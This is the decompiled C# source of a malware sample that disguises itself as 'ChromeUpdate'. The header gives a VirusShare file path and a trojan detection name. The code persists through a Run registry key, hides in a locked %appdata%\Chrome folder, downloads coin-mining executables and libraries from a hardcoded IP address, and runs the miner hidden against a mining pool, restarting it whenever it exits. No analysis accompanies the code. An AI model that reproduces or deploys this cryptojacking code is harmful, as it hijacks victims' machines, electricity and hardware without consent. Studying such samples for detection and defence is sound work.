// Decompiled with JetBrains decompiler
// Type: Form3
// Assembly: ChromeUpdate, Version=3.5.4.1, Culture=neutral, PublicKeyToken=null
// MVID: 6FE456AD-2EDE-44D5-8F90-23B35BC782D3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.Win32.Generic-570994cf399be5c9172c4b1547ad46af932cce3873b98c940d81759f40e71701.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

[StandardModule]
public sealed class Form3
{
  private static WebClient WebClient1 = new WebClient();
  private static Process MiningProcess = new Process();

  [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetModuleFileName(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

  [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int MoveFile([MarshalAs(UnmanagedType.LPTStr), In] string lpExistingFileName, [MarshalAs(UnmanagedType.LPTStr), In] string lpNewFileName, long dwFlags);

  [STAThread]
  public static void Main()
  {
    string name = "goblmah371z";
    Mutex mutex;
    try
    {
      mutex = Mutex.OpenExisting(name);
      Environment.Exit(0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      mutex = new Mutex(true, name);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Interaction.Environ("appdata") + "\\Chrome"))
        Form3.LockAndHideFolder(Interaction.Environ("appdata") + "\\Chrome");
      MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Chrome Updater", (object) (Interaction.Environ("appdata") + "\\Chrome\\ChromeUpdate.exe"));
      if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\ChromeUpdate.exe"))
      {
        string fileName1 = Process.GetCurrentProcess().MainModule.FileName;
        string fileName2 = Process.GetCurrentProcess().MainModule.FileName;
        int moduleFileName = Form3.GetModuleFileName(0, ref fileName2, 256);
        Form3.MoveFile(Strings.LSet(fileName1, moduleFileName), Interaction.Environ("appdata") + "\\Chrome\\ChromeUpdate.exe", 8L);
      }
      string path = Interaction.Environ("windir") + "\\System32\\OpenCL.DLL";
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      if (System.IO.File.Exists(path))
      {
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\CGMiner.exe"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/CGMiner.exe", Interaction.Environ("appdata") + "\\Chrome\\CGMiner.exe");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\diablo130302.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/diablo130302.cl", Interaction.Environ("appdata") + "\\Chrome\\diablo130302.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\diakgcn121016.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/diakgcn121016.cl", Interaction.Environ("appdata") + "\\Chrome\\diakgcn121016.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\libeay32.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libeay32.dll", Interaction.Environ("appdata") + "\\Chrome\\libeay32.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\libidn-11.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libidn-11.dll", Interaction.Environ("appdata") + "\\Chrome\\libidn-11.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\libpdcurses.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libpdcurses.dll", Interaction.Environ("appdata") + "\\Chrome\\libpdcurses.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\phatk121016.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/phatk121016.cl", Interaction.Environ("appdata") + "\\Chrome\\phatk121016.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\poclbm130302.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/poclbm130302.cl", Interaction.Environ("appdata") + "\\Chrome\\poclbm130302.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\libcurl.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libcurl.dll", Interaction.Environ("appdata") + "\\Chrome\\libcurl.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\pthreadGC2.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/pthreadGC2.dll", Interaction.Environ("appdata") + "\\Chrome\\pthreadGC2.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\scrypt130511.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/scrypt130511.cl", Interaction.Environ("appdata") + "\\Chrome\\scrypt130511.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\ssleay32.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/ssleay32.dll", Interaction.Environ("appdata") + "\\Chrome\\ssleay32.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\zlib1.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/zlib1.dll", Interaction.Environ("appdata") + "\\Chrome\\zlib1.dll");
        Thread.Sleep(3009);
        ProcessStartInfo startInfo = Form3.MiningProcess.StartInfo;
        startInfo.FileName = Interaction.Environ("appdata") + "\\Chrome\\CGMiner.exe";
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "-o http://api.bitcoin.cz:8332 -u henkie123.worker2 -p kaasbaas123 --auto-fan --auto-gpu --gpu-threads 10 --gpu-fan 60 --temp-target 100 --temp-overheat 110 --no-submit-stale";
      }
      else
      {
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\Chrome.exe"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/coin-miner.exe", Interaction.Environ("appdata") + "\\Chrome\\Chrome.exe");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\bdb.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/bdb.dll", Interaction.Environ("appdata") + "\\Chrome\\bdb.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\btc.il"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/btc.il", Interaction.Environ("appdata") + "\\Chrome\\btc.il");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\btc-evergreen.il"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/btc-evergreen.il", Interaction.Environ("appdata") + "\\Chrome\\btc-evergreen.il");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\coinutil.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/coinutil.dll", Interaction.Environ("appdata") + "\\Chrome\\coinutil.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\miner.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/miner.dll", Interaction.Environ("appdata") + "\\Chrome\\miner.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\phatk.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/phatk.cl", Interaction.Environ("appdata") + "\\Chrome\\phatk.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\phatk.ptx"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/phatk.ptx", Interaction.Environ("appdata") + "\\Chrome\\phatk.ptx");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Chrome\\usft_ext.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/usft_ext.dll", Interaction.Environ("appdata") + "\\Chrome\\usft_ext.dll");
        Thread.Sleep(3009);
        ProcessStartInfo startInfo = Form3.MiningProcess.StartInfo;
        startInfo.FileName = Interaction.Environ("appdata") + "\\Chrome\\Chrome.exe";
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "-a sha256 -g no -o http://api.bitcoin.cz:8332 -u henkie123.worker2 -p kaasbaas123 -t 8";
      }
      Form3.MiningProcess.Start();
      Form3.MiningProcess.EnableRaisingEvents = true;
      Form3.MiningProcess.Exited += new EventHandler(Form3.MiningProcessClosed);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) Interaction.MsgBox((object) ex);
      ProjectData.ClearProjectError();
    }
    while (true)
      Thread.Sleep(3009);
  }

  public static void MiningProcessClosed(object sender, EventArgs e) => Form3.MiningProcess.Start();

  public static bool LockAndHideFolder(string path)
  {
    string name = WindowsIdentity.GetCurrent().Name;
    FileSystemAccessRule rule1 = new FileSystemAccessRule("Administrators", FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
    FileSystemAccessRule rule2 = new FileSystemAccessRule(name, FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny);
    FileSystemAccessRule rule3 = new FileSystemAccessRule(name, FileSystemRights.Modify, InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
    DirectorySecurity directorySecurity = new DirectorySecurity();
    directorySecurity.AddAccessRule(rule1);
    directorySecurity.AddAccessRule(rule3);
    directorySecurity.AddAccessRule(rule2);
    bool flag;
    try
    {
      Process process = new Process();
      Directory.CreateDirectory(path, directorySecurity);
      process.StartInfo = new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = "CMD.exe",
        Arguments = "/C attrib -s -h " + Convert.ToString(path)
      };
      process.Start();
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }
}
